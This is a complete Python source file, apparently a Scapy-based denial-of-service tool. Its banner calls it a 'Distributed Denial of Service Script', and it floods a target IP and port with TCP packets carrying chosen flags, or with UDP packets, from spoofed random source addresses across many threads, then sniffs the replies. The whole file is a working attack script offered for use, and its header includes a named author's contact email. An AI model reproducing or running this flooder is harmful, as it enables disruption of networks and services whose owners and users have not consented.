from scapy.all import*
import socket
import sys
import threading
import time
import getopt

def usage_func():

	print(
		"\n-h, --help \t\tPrint this help menu\n"
		"-t, --tcp \t\tFlooding with Transfer Control Protocol\n"
		"-u, --udp \t\tFlooding with User Datagram Protocol\n"
		"-d, --destination \t\tTarget/Victim IP Address\n"
		"-p, --port \t\tDestination Port/Service\n"
		"-c, --count \t\tAmount of packets to send\n"
		"-s, --sources \t\tNumber of threads\n"
		"-f, --flags \t\tTCP flags: S|SA|F|FA|R\n"
		"\nEXAMPLE: python ddos.py -d 127.0.0.1 -p 80 -t -f S -c 100 -s 10\n"
		)

	sys.exit(0)

def pkt_capture(raw_packets):

	addr_src = raw_packets[IP].src
	addr_dst = raw_packets[IP].dst

	try:
		if raw_packets[TCP]:

			port_dst = raw_packets[TCP].dport
			tcp_flags = raw_packets[TCP].flags

			flag_dict = {
				1:"FIN",
				2:"SYN",
				4:"RST",
				8:"PSH",
				20L:"RA",
				17L:"FA",
				18L:"SA",
				16L:"ACK",
				32L:"URG" 
			}

			print("[TCP] %s\t--> %s:%d \t-\tflag = %s"%(addr_src, addr_dst, port_dst, flag_dict[tcp_flags]))
	except IndexError:
		pass

	try:
		if raw_packets[UDP]:
			port_dst = raw_packets[UDP].dport
			print("[UDP] %s\t--> %s:%d"%(addr_src, addr_dst, port_dst))
	except IndexError:
		pass

def socket_probe(dst_ip, dst_port):

	sock_probe = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock_probe.settimeout(5)

	if sock_probe.connect_ex((dst_ip, dst_port)):

		print("[!] Socket %s:%s seems to be closed. Exiting.." %(dst_ip, dst_port))
		sock_probe.close()
		sys.exit(0)

	else:

		print("[*] Socket open. Starting flooding attack!..")

def flood_tcp(destination_ip, destination_port, packets, transport_type, tcp_flags):

	time.sleep(2)

	layer3 = IP()
	layer3.src = RandIP()
	layer3.dst = destination_ip

	if transport_type.upper() == "TCP":

		Transport_Layer = TCP()
		Transport_Layer.dport = destination_port
		Transport_Layer.flags = tcp_flags.upper()
		Transport_Layer.sport = 65535

	elif transport_type.upper() == "UDP":

		Transport_Layer = UDP()
		Transport_Layer.dport = destination_port
		Transport_Layer.sport = 65535
		Raw_Data = Raw()
		Raw_Data.load = "\x41\x42\x43"*10


	send(layer3/Transport_Layer,count=packets)

def main():

	#ip_target = None
	#port = 0
	#threads = 0
	#pkt_count = 0
	#layer4 = TCP
	#layer4_flags = "S"

	print (
	"-----------------------------------------------\n"
	"|  Distributed Denial of Service Script       |\n"
	"|        By Julian Ramirez Gomez              |\n"
	"| Contact: julian.ramirez@getronics-latam.com |\n"
	"|        @Getronics Colombia LTDA.            |\n"
	"-----------------------------------------------\n"
	)

	if len(sys.argv) < 2:
		usage_func()

	conf.verb = 0
	opts, args = getopt.getopt(sys.argv[1:],"htud:p:c:s:f:",["help","tcp","udp","destination=","port=","count=","sources=","flag="])

	try:
		for o, argument in opts:

			if o in ("-h", "--help"):
				usage_func()
			elif o in ("-t", "--tcp"):
				layer4 = "TCP"
			elif o in ("-u", "--udp"):
				layer4 = "UDP"
			elif o in ("-d", "--destination"):
				ip_target = argument
			elif o in ("-p", "--port"):
				port = int(argument)
			elif o in ("-c", "--count"):
				pkt_count = int(argument)
			elif o in ("-s", "--sources"):
				threads = int(argument)
			elif o in ("-f", "--flag") and layer4 == "TCP":
				layer4_flags = argument
			else:
				assert False, "Invalid Options.. type %s -h for more options" %sys.argv[0]
				sys.exit(0)

	except getopt.GetoptError as Error:
		print(str(Error))
		sys.exit(0)

	if layer4.upper() == "TCP":

		print("[!] Probing connection")
		socket_probe(ip_target, port)

	print("[*] Flooding with %d threads and %d packets per thread:\n" % (threads, pkt_count))

	for i in range(threads):

		flood_thread = threading.Thread(target=flood_tcp, args=(ip_target, port, pkt_count, layer4, layer4_flags))
		flood_thread.start()
	
	try:
		sniff(prn=pkt_capture, filter="ip host %s" %ip_target, count=pkt_count*threads)

	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()
